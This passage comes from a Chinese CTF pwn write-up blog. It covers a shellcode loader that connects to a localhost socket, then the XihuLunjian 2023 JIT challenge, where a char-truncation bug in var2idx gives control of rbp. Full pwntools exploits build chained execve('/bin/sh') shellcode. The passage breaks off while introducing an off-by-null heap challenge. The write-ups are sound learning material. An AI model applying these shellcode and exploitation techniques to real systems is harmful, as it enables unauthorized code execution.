class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> *<span class="title">serv_addr</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    <span class="built_in">memset</span>(serv_addr, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">    serv_addr-&gt;sin_family = AF_INET;</span><br><span class="line">    serv_addr-&gt;sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    serv_addr-&gt;sin_port = htons(<span class="number">8888</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io=process(<span class="string">&#x27;./master-of-orw&#x27;</span>)</span><br><span class="line"></span><br><span class="line">socket_struct = <span class="number">0x020022b87f000001</span></span><br><span class="line">asm_socket = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 41</span></span><br><span class="line"><span class="string">mov rdi, 2</span></span><br><span class="line"><span class="string">mov rsi, 1</span></span><br><span class="line"><span class="string">xor rdx, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">push_socket_struct = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov r15, 0x0100007fb8220002</span></span><br><span class="line"><span class="string">push r15</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">asm_connect = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi, rsp</span></span><br><span class="line"><span class="string">mov rdi, 3</span></span><br><span class="line"><span class="string">mov rdx, 0x10</span></span><br><span class="line"><span class="string">mov rax, 42</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">cyc_recv = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi, 0x400000</span></span><br><span class="line"><span class="string">mov r14, 0xcfcc8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">again:</span></span><br><span class="line"><span class="string">mov edi, 3</span></span><br><span class="line"><span class="string">mov rdx, 0x1000</span></span><br><span class="line"><span class="string">mov r10d, 0</span></span><br><span class="line"><span class="string">xor r8d, r8d</span></span><br><span class="line"><span class="string">xor r9d, r9d</span></span><br><span class="line"><span class="string">mov eax, 45 ;// recvfrom</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">add rsi, rax</span></span><br><span class="line"><span class="string">sub r14, rax</span></span><br><span class="line"><span class="string">cmp r14,0</span></span><br><span class="line"><span class="string">jge again</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0x401620 //orw的main函数地址</span></span><br><span class="line"><span class="string">ret</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcraft.mmap(<span class="number">0x400000</span>,<span class="number">0x100000</span>,<span class="number">7</span>,<span class="number">33</span>,<span class="number">0</span>,<span class="number">0</span>)) + \</span><br><span class="line">            asm(asm_socket) + asm(push_socket_struct) + asm(asm_connect) + \</span><br><span class="line">            asm(cyc_recv)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;code\n&#x27;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(shellcode)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1B-西湖论剑2023-JIT"><a href="#0x1B-西湖论剑2023-JIT" class="headerlink" title="0x1B.西湖论剑2023 JIT"></a>0x1B.西湖论剑2023 JIT</h2><p>C++写的，没去符号表</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231130145529369.png" alt="image-20231130145529369"></p><p>进入到<code>Compiler::main</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231130151108239.png" alt="image-20231130151108239"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mmap出来一块内存，初始化这块内存。</span></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">JITHelper::init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  JITHelper::execbuf = (<span class="type">char</span> *)<span class="built_in">mmap</span>(<span class="number">0LL</span>, <span class="number">0x2000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  JITHelper::exec_wr = JITHelper::execbuf;</span><br><span class="line">  <span class="built_in">memset</span>(JITHelper::execbuf, <span class="string">&#x27;\xCC&#x27;</span>, <span class="number">0x2000</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回可执行内存的入口点</span></span><br><span class="line"><span class="function"><span class="type">void</span> *__cdecl <span class="title">JITHelper::nowptr</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> JITHelper::exec_wr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::string *__cdecl std::literals::string_literals::<span class="keyword">operator</span><span class="string">&quot;&quot;</span> s[abi:cxx11](</span><br><span class="line">        std::string *__return_ptr retstr,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *__str,</span><br><span class="line">        std::<span class="type">size_t</span> __len)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+27h] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  std::string::<span class="built_in">basic_string</span>(retstr, __str, __len, &amp;v5);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v5);</span><br><span class="line">  <span class="keyword">return</span> retstr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>std::literals::string_literals::operator&quot;&quot; s[abi:cxx11](&amp;boot, _str, 0xBuLL);</code>_str如下所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231130151959940.png" alt="image-20231130151959940"></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231130152059550.png" alt="image-20231130152059550"></p><p>_str实际上是一段指令。往boot中写入这段指令。</p><p>看到<code>JITHelper::write(&amp;p_payload);</code></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231130152634007.png" alt="image-20231130152634007"></p><p>就是将boot中的指令拷贝到<code>JITHelper::exec_wr</code>中，如下图</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231201200437800.png" alt="image-20231201200437800"></p><p>然后将<code>JITHelper::exec_wr</code>指针向后移。继续往下看</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> __cdecl <span class="title">IRstream::empty</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> std::string::<span class="built_in">size</span>(&amp;IRstream::ir[abi:cxx11]) == IRstream::pos;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">Compiler::handleFn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  u8 id; <span class="comment">// [rsp+5h] [rbp-13h] BYREF</span></span><br><span class="line">  u8 args; <span class="comment">// [rsp+6h] [rbp-12h]</span></span><br><span class="line">  u8 locals; <span class="comment">// [rsp+7h] [rbp-11h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( IRstream::<span class="built_in">getop</span>() != <span class="number">0xFF</span> )</span><br><span class="line">    <span class="built_in">fatal</span>();</span><br><span class="line">  id = IRstream::<span class="built_in">getop</span>();</span><br><span class="line">  <span class="keyword">if</span> ( std::unordered_map&lt;<span class="type">unsigned</span> <span class="type">char</span>,Compiler::func&gt;::<span class="built_in">count</span>(&amp;Compiler::funcs, &amp;id) )</span><br><span class="line">    <span class="built_in">fatal</span>();</span><br><span class="line">  args = IRstream::<span class="built_in">getop</span>();</span><br><span class="line">  locals = IRstream::<span class="built_in">getop</span>();</span><br><span class="line">  Compiler::<span class="built_in">creatFunc</span>(id, args, locals);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">u8 __cdecl <span class="title">IRstream::getop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 r; <span class="comment">// [rsp+Fh] [rbp-9h]</span></span><br><span class="line"></span><br><span class="line">  v0 = IRstream::pos + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v0 &gt; std::string::<span class="built_in">size</span>(&amp;IRstream::ir[abi:cxx11]) )</span><br><span class="line">    <span class="built_in">fatal</span>();</span><br><span class="line">  r = *(_BYTE *)(std::string::<span class="built_in">data</span>((__int64)&amp;IRstream::ir[abi:cxx11]) + IRstream::pos);</span><br><span class="line">  ++IRstream::pos;</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>IRstream::ir</code>指向JIT指令的起始位置，<code>IRstream::pos</code>指向当前的JIT指令，getop()就是根据pos从ir中获取1字节的指令。</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231201204703525.png" alt="image-20231201204703525"></p><p>根据id创建函数，将函数映射到<code>Compiler::funcs</code>，然后进入到<code>creatFunc</code>函数中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231204134328427.png" alt="image-20231204134328427"></p><p>参数不能大于8个，局部变量不能多于0x20个；<code>unk_59E0</code>也是一段代码，我们写一个简单的指令来调试一下：<code>payload=p8(0xff)+p8(0)+p8(1)+p8(1)</code></p><p>当运行完<code>JITHelper::write(&amp;p_payload);</code>之后，<code>JITHelper::exec_wr</code>中的指令如下所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231204134642728.png" alt="image-20231204134642728"></p><p>红框中就是<code>unk_59E0</code>中的指令。运行完<code>JITHelper::bwrite&lt;int&gt;(8 * locals);</code>之后，指令变成了如下所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231204134903038.png" alt="image-20231204134903038"></p><p>由于我们设置的局部变量数据只有1个，所以这里将8*1写入了其中，抬栈8个字节。在这个函数中就是为函数开辟栈空间。</p><p>看到<code>Compiler::handleFnBody</code>函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231204135841224.png" alt="image-20231204135841224"></p><p>通过循环取opcode来决定要执行的代码，case 0的操作最为简单，从case 0看起</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0u</span>:</span><br><span class="line">  v0 = IRstream::<span class="built_in">getop</span>();</span><br><span class="line">  <span class="keyword">return</span> Compiler::<span class="built_in">var2idx</span>(v0);</span><br></pre></td></tr></table></figure><p>取下一个字节opcode，然后传入<code>Compiler::var2idx</code>，看到这个函数</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231204141828923.png" alt="image-20231204141828923"></p><p>最高位为1时取局部变量，最高位为0时取参数，题目限制args&lt;&#x3D;8,locals&lt;&#x3D;0x20,根据这个限制，写一个脚本打印出<code>var2idx</code>的所有返回值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">var2idx</span>(<span class="params">varib</span>):</span><br><span class="line">    <span class="keyword">if</span> varib&amp;<span class="number">0x7f</span>==<span class="number">0</span>:</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> varib&amp;<span class="number">0x80</span>==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> varib&gt;<span class="number">8</span>:</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">8</span>*varib&lt;=<span class="number">0</span>:</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span>*varib</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        variba=varib^<span class="number">0x80</span></span><br><span class="line">        <span class="keyword">if</span> variba&gt;<span class="number">0x20</span>:</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> -<span class="number">8</span>*variba&gt;<span class="number">0</span>:</span><br><span class="line">            exit(-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">8</span>*variba</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">hex</span>(var2idx(i)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x81</span>,<span class="number">0x81</span>+<span class="number">0x20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(i)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">hex</span>(var2idx(i)))</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">0x1:0x8</span><br><span class="line">0x2:0x10</span><br><span class="line">0x3:0x18</span><br><span class="line">0x4:0x20</span><br><span class="line">0x5:0x28</span><br><span class="line">0x6:0x30</span><br><span class="line">0x7:0x38</span><br><span class="line">0x8:0x40</span><br><span class="line">0x81:-0x8</span><br><span class="line">0x82:-0x10</span><br><span class="line">0x83:-0x18</span><br><span class="line">0x84:-0x20</span><br><span class="line">0x85:-0x28</span><br><span class="line">0x86:-0x30</span><br><span class="line">0x87:-0x38</span><br><span class="line">0x88:-0x40</span><br><span class="line">0x89:-0x48</span><br><span class="line">0x8a:-0x50</span><br><span class="line">0x8b:-0x58</span><br><span class="line">0x8c:-0x60</span><br><span class="line">0x8d:-0x68</span><br><span class="line">0x8e:-0x70</span><br><span class="line">0x8f:-0x78</span><br><span class="line">0x90:-0x80</span><br><span class="line">0x91:-0x88</span><br><span class="line">0x92:-0x90</span><br><span class="line">0x93:-0x98</span><br><span class="line">0x94:-0xa0</span><br><span class="line">0x95:-0xa8</span><br><span class="line">0x96:-0xb0</span><br><span class="line">0x97:-0xb8</span><br><span class="line">0x98:-0xc0</span><br><span class="line">0x99:-0xc8</span><br><span class="line">0x9a:-0xd0</span><br><span class="line">0x9b:-0xd8</span><br><span class="line">0x9c:-0xe0</span><br><span class="line">0x9d:-0xe8</span><br><span class="line">0x9e:-0xf0</span><br><span class="line">0x9f:-0xf8</span><br><span class="line">0xa0:-0x100</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>var2idx</code>的返回值范围为<code>[-0x100,0x40]</code>.</p><p>case 0时就直接从<code>handleFnBody</code>中return了，以这样的payload试试:<code>p8(0xff)+p8(0)+p8(1)+p8(0x20)+p8(0)+p8(0x81)</code></p><p>在<code>handleFnBody</code>之后是<code>func_ret</code>，handleFnBody的返回值和局部变量数作为参数传入其中：</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231204204209759.png" alt="image-20231204204209759"></p><p>当程序运行到如下代码之后</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231204204552705.png" alt="image-20231204204552705"></p><p>此时exec_wr中的指令为</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231204204724746.png" alt="image-20231204204724746"></p><p>我们再把payload修改为：<code>p8(0xff)+p8(0)+p8(1)+p8(0x20)+p8(0)+p8(0x86)</code>，exec_wr中的指令变为了如下</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214151602079.png" alt="image-20231214151602079"></p><p><code>lea    rdi,[rbp-xx]</code>中的数字就是<code>var2idx</code>的返回值，在<code>func_ret</code>函数中，生成了函数退出的指令。</p><p>再分析功能码1的指令，输入payload：<code>p8(0xff)+p8(0)+p8(1)+p8(0x20)+p8(1)+p8(0x81)+p64(0x100)</code></p><p>得到以下指令</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214155322299.png" alt="image-20231214155322299"></p><p>即var&#x3D;imm，将1个立即数赋值给一个参数或者局部变量</p><p>看到功能码2，使用payload：<code>p8(0xff)+p8(0)+p8(1)+p8(0x20)+p8(2)+p8(0x81)+p64(0x82)</code></p><p>得到以下指令</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214155950239.png" alt="image-20231214155950239"></p><p>即var1&#x3D;var2，将var2的值赋值给var1</p><p>看到功能码3，使用payload：<code>p8(0xff)+p8(0)+p8(1)+p8(0x20)+p8(3)+p8(0x81)+p64(0x82)</code></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214160542711.png" alt="image-20231214160542711"></p><p>很明显，var1&amp;&#x3D;var2</p><p>看到功能码4，使用payload：<code>p8(0xff)+p8(0)+p8(1)+p8(0x20)+p8(4)+p8(0x81)+p64(0x82)</code></p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214161303599.png" alt="image-20231214161303599"></p><p>var1|&#x3D;var2</p><p>功能5：</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214161540639.png" alt="image-20231214161540639"></p><p>var1^&#x3D;var2</p><p>功能6太长了，暂时不看。</p><p>在生成完指令之后，会跳出<code>handleFn</code>函数，进入到一大串if判断</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214170624741.png" alt="image-20231214170624741"></p><p>要求有id为0的函数，且这个函数的参数数量为0，并且entry+boot能够找到这个函数，这里就是在判断main函数。</p><p>那么漏洞点在哪里？</p><p>在所有功能中，对于参数和局部变量的取值都是以rbp-xx的形式，在var2idx函数中</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214172554830.png" alt="image-20231214172554830"></p><p>返回偏移量的时候，是char类型，对于参数，返回值的范围是[0x8,0x40]，而对于局部变量，返回值的范围则是[-0x8,-0x100]，而0x100则会被截断变成0，此时就可以控制rbp的值。如下图所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231214173343553.png" alt="image-20231214173343553"></p><p>该如何利用？</p><p>在一开始调用这些指令时</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231215111127360.png" alt="image-20231215111127360"></p><p>rbp和rsp指向同一处，然后函数序言sub rsp,0x100开辟函数栈，函数尾声的时候add rsp，0x100还原函数栈</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231215111559296.png" alt="image-20231215111559296"></p><p>紧跟着ret，就是pop rip，将栈顶的值弹出到rip继续执行，而由于rbp和rsp相同，所以控制了rbp的值就相当于控制了rsp的值，也就能控制JIT指令执行完毕后要执行的指令。</p><p>利用思路就是把execve(“&#x2F;bin&#x2F;sh”)的shellcode的字节码先通过功能1赋值到栈上，这样exec_buf中就有了字节码，由于字节码一次只能存储8字节，并且字节码之间会有JIT的字节码，所以需要使用jmp short s这样的段跳转指令来连接每条shellcode；最后控制rbp的值，使其指向shellcode的开始处。(因为开启了NX，所以栈没有可执行权限，只能在execbuf中进行shellcode执行)</p><p>如下所示</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231215163557255.png" alt="image-20231215163557255"></p><p>第一个8字节为<code>\x48\x31\xf6\xeb\x0c\x00\x00\x00</code>，第二个8字节为<code>\x48\x31\xd2\xeb\x0c\x00\x00\x00</code>，可以看到这两个8字节之间是分开的，中间还存储着JIT字节码，所以在第一个8字节中，需要使用jmp进行跳转到第二个8字节的shellcode中，第二个再跳到第三个，依次类推。使用<code>jmp 0xe</code>这样子的跳转来跳转到第二个8字节的shellcode继续执行。</p><p>这是shellcode的主体，我们还需要修改rbp的值，使其能够跳转执行我们的shellcode。</p><p>我们的shellcode的起始位置的末尾两字节是0x25，所以我们将rbp的值末尾两字节修改为0x25即可</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219143311649.png" alt="image-20231219143311649"></p><p>这样ret就能够执行我们的shellcode</p><p>exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">io=process(<span class="string">&#x27;./jit&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=p8(<span class="number">0xff</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0</span>)+p8(<span class="number">0x20</span>)</span><br><span class="line">payload+=p8(<span class="number">1</span>)+p8(<span class="number">0x8b</span>)+<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload+=p8(<span class="number">1</span>)+p8(<span class="number">0x8a</span>)+<span class="string">b&#x27;\x48\x31\xf6\xeb\x0c\x00\x00\x00&#x27;</span> <span class="comment">#mov [rbp-0x50],&quot;xor rsi,rsi;jmp 0xe&quot;</span></span><br><span class="line">payload+=p8(<span class="number">1</span>)+p8(<span class="number">0x89</span>)+<span class="string">b&#x27;\x48\x31\xd2\xeb\x0c\x00\x00\x00&#x27;</span> <span class="comment">#mov [rbp-0x48],&quot;xor rdx,rdx;jmp 0xe&quot;</span></span><br><span class="line">payload+=p8(<span class="number">1</span>)+p8(<span class="number">0x88</span>)+<span class="string">b&#x27;\x48\x31\xc0\xeb\x0c\x00\x00\x00&#x27;</span> <span class="comment">#mov [rbp-0x40],&quot;xor rax,rax;jmp 0xe&quot;</span></span><br><span class="line">payload+=p8(<span class="number">1</span>)+p8(<span class="number">0x87</span>)+<span class="string">b&#x27;\x48\x83\xc0\x3b\xeb\x0b\x00\x00&#x27;</span> <span class="comment">#mov [rbp-0x38],&quot;add rax,0x3b;jmp 0xd&quot;</span></span><br><span class="line">payload+=p8(<span class="number">1</span>)+p8(<span class="number">0x86</span>)+<span class="string">b&#x27;\x0f\x05\x00\x00\x00\x00\x00\x00&#x27;</span> <span class="comment">#mov [rbp-0x30],&quot;syscall&quot;</span></span><br><span class="line">payload+=p8(<span class="number">1</span>)+p8(<span class="number">0x85</span>)+p64(<span class="number">0x25</span>)</span><br><span class="line">payload+=p8(<span class="number">1</span>)+p8(<span class="number">0x84</span>)+p64(<span class="number">0xffffffffff00</span>)</span><br><span class="line">payload+=p8(<span class="number">3</span>)+p8(<span class="number">0xa0</span>)+p8(<span class="number">0x84</span>)</span><br><span class="line">payload+=p8(<span class="number">4</span>)+p8(<span class="number">0xa0</span>)+p8(<span class="number">0x85</span>)</span><br><span class="line">payload+=p8(<span class="number">0</span>)+p8(<span class="number">0x8b</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="0x1C-强网杯2023-warmup23"><a href="#0x1C-强网杯2023-warmup23" class="headerlink" title="0x1C.强网杯2023 warmup23"></a>0x1C.强网杯2023 warmup23</h2><p>这题考察的就是高版本的off-by-null的利用</p><p><img src="https://raw.githubusercontent.com/LindLL/blog-img/main/image-20231219143542764.png" alt="image-20231219143542764"></p><p>不限制堆块的大小，但是会在写入的数据的末尾添加0字符，这样就无法直接泄露出libc地址以及堆地址，需要通过off-by-null构造出overlapchunk之后才能泄露信息。</p><p>高版本的off-by-null基本都是通过largebin的残留信息来构造出<code>fake_chunk-&gt;fd-&gt;bk==fake_chunk,fake_chunk-&gt;bk-&gt;fd==fake_chunk</code>这样的条件，进而绕过检查。</p><p>这道题比赛的时候我是照着<a href="https://tttang.com/archive/1614/#toc__1">glibc2.29+的off by null利用 - 跳跳糖 